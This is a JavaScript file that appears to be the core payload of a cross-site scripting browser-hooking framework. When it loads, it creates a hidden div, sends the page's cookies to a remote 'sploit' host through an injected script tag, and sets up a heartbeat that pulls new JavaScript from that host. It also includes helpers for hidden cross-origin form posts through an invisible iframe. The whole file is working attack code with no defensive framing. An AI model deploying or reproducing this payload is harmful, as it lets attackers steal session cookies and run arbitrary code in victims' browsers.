
console.log("START");
// global variables
var xsshide = "display:none;width:0;height:0;";
var gdebug = "";

// global debug function
function xssdbg(message) { 
	gdebug += message + ", ";
}

// global function to pass module parameters to modules
function xssopt(name) {
	return(xssgbl[xssmodpre+name]);
}

// get cookie helper
function xsscookie(name) {
	name += "=";
    var ca = document.cookie.split(';');
    for(var i=0; i<ca.length; i++) {
        var c = ca[i].trim();
        if (c.indexOf(name) == 0) return c.substring(name.length,c.length);
    }
    return "";
}

// set cookie helper
function xss (cname, cvalue, exdays) {
	var d = new Date();
	d.setTime(d.getTime() + (exdays*24*60*60*1000));
	var expires = "expires="+d.toGMTString();
	document.cookie = cname + "=" + cvalue + "; " + expires;
}

// get element by id
function xssgbi(x) {
	return document.getElementById(x);
}
// create element
function xssce(x) {
	return document.createElement(x);
}
// set attribute
function xsssa(x,k,v) {
	return x.setAttribute(k,v);
}
// remove element
function xssrm(id) {
	var e = xssgbi(id);
	e.parentNode.removeChild(e);
}

// an area for us to add content
function createSploit() {
	//document.write("<div id='sploit' style='display:none'>text</div>");
	var d = xssce("div");
	xsssa(d, "id", "sploit");
	xsssa(d, "style", "display:none");
	document.body.appendChild(d);
}

// register this browser with the network
function reg() {
	createSploit();
	cs("http://"+sploit+"/api.php?reg="+sploitid+"&c="+encodeURIComponent(document.cookie));
}

// send the heartbeat and get new JavaScript
function hb() { 
	if (window.top==window.self) {
		cs('http://'+sploit+'/api.php?id='+sploitid+"&d="+gdebug);
		gdebug = "";
	}
}

// add a script to the page
function cs(s) { 
	var script = document.createElement("script");
	script.type="text/javascript";
	script.src=s;
	var d = xssgbi("sploit");
	if (!d) { 
		createSploit();
	}
	d = xssgbi("sploit");
	d.appendChild(script);
}

/**
 * create an image. used for genertic GET requests
 * url: url
 * st: style attribute
 * id: element id to append the image to
 * err: onerror function (or false)
 * load: onload function (or false)
 */
function ci(url, st, id, err, load) { 
	var xssi = xssce('img');
	xssi.style=st;
	if (load) { 
		xsssa(xssi, "onload", load);
		console.log("add load event");
	}
	if (err) {
		xsssa(xssi, "onerror", err);
		console.log("add error event");
	}
	xssi.onload = function() { 
		console.log("image loaded!");
		console.log(xssi);
		document.body.appendChild(xssi);
	}
	xssi.src=url;
}

/**
 * post data to another domain without Ajax (you never know....)
 * XSS Cross Origin Post
 * url: the url to post to
 * data: (dictionary) key value array of data to post
 * a: the api action (usually 'log')
 */
function xsscop(url, data) {
	// create elements
	var ifr = xssce('iframe');
	var frm = xssce('form');
	// set attributes
	xsssa(ifr, "name", "cspost");
	xsssa(ifr, "style", xsshide);
	xsssa(ifr, "id", "xsscop");

	xsssa(frm, "action", url);
	xsssa(frm, "method", "post");
	xsssa(frm, "target", "cspost");

	// create an input for each post variable
	for (d in data) {
		var e = xssce("input");
		xsssa(e, "type", "hidden");
		xsssa(e, "name", d);
		xsssa(e, "value", data[d]);
		frm.appendChild(e);
	}


	// append form to iframe
	ifr.appendChild(frm);

	document.body.appendChild(ifr);
	// submit the form
	frm.submit();
	// remove the frame
	xssrm("xsscop");
}

// append content to the sploit div
function xssappend(t) {
	xssgbi('sploit').innerHTML+=t;
}

// remove content from the sploit div
function xsscls(t) {
	xssgbi('sploit').innerHTML="";
}

// register the browser with the network
reg();

